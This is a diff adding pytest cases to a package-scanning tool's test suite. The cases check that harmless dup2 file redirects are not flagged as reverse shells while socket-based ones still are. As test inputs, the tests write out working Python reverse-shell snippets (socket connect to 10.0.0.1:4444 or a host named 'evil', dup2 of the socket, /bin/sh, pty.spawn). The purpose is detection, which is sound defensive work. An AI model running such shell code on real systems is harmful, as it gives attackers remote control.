@@ -2360,3 +2360,85 @@ def test_the_toml_helpers_run_without_stdlib_tomllib(monkeypatch):
 
     assert _supported_python_versions(REPO_ROOT)[0] == "3.9"
     assert any(source == "pyproject.toml" for source, _ in _audited_requirements(REPO_ROOT))
+
+
+# ──────────────────────────────────────────────────────────────────────
+# dup2 needs a socket to mean "reverse shell"
+# ──────────────────────────────────────────────────────────────────────
+
+def _reverse_shell_findings(source: str):
+    return [
+        f
+        for f in sp.check_py_file(source, "pkg/module.py", "pkg")
+        if f.check == "Reverse shell / bind shell pattern"
+    ]
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        # triton 3.8.0's _internal_testing.py, the shape that reddened main.
+        'import os, tempfile\n'
+        'def capture():\n'
+        '    tmp = tempfile.TemporaryFile()\n'
+        '    saved = os.dup(2)\n'
+        '    os.dup2(tmp.fileno(), 2)\n'
+        '    os.dup2(saved, 2)\n',
+        # torch's elastic redirect plumbing: dup2 and nothing else at all.
+        'import os\n'
+        'def redirect(to_fd, from_fd):\n'
+        '    os.dup2(to_fd, from_fd)\n',
+    ],
+)
+def test_dup2_without_a_socket_is_not_a_reverse_shell(source):
+    """Pointing a descriptor at a FILE is ordinary, and used to be CRITICAL.
+
+    Ten of the nineteen reverse-shell entries in the committed baseline are this
+    shape and not one is a true positive, so the finding cost review time and
+    reopened whenever an unrelated release touched the file.
+    """
+    assert _reverse_shell_findings(source) == []
+
+
+def test_dup2_onto_a_socket_is_still_a_reverse_shell():
+    source = (
+        'import os, socket, subprocess\n'
+        's = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n'
+        's.connect(("10.0.0.1", 4444))\n'
+        'os.dup2(s.fileno(), 0)\n'
+        'os.dup2(s.fileno(), 1)\n'
+        'subprocess.call(["/bin/sh"])\n'
+    )
+    found = _reverse_shell_findings(source)
+    assert len(found) == 1 and found[0].severity == sp.CRITICAL
+    # Both halves are recorded, so the entry reopens if either one changes.
+    assert "dup2" in found[0].evidence and "socket" in found[0].evidence
+
+
+def test_socketless_payloads_still_fire():
+    """The alternatives that never depended on dup2 are untouched."""
+    assert _reverse_shell_findings('import pty\npty.spawn("/bin/bash")\n')
+    assert _reverse_shell_findings(
+        'import socket, subprocess\n'
+        's = socket.socket()\n'
+        's.connect(("evil", 1))\n'
+        'subprocess.call("/bin/sh")\n'
+    )
+
+
+def test_committed_baseline_covers_the_zoo_url_guard():
+    """unsloth-zoo's SSRF guard reads one env var and holds a blocklist of
+    metadata hostnames, next to the requests session it exists to police, so it
+    trips two combination checks. Reviewed as benign and allowlisted; without
+    these entries every Security audit run on main is red.
+    """
+    path = REPO_ROOT / "scripts" / "scan_packages_baseline.json"
+    entries = json.loads(path.read_text(encoding = "utf-8"))["entries"]
+    checks = {
+        e["check"]
+        for e in entries
+        if e["package"].replace("_", "-") == "unsloth-zoo"
+        and e["file"] == "unsloth_zoo/vision_utils.py"
+    }
+    assert "Harvests environment variables/secrets AND makes network calls" in checks
+    assert "Accesses cloud metadata/IMDS AND makes network calls" in checks
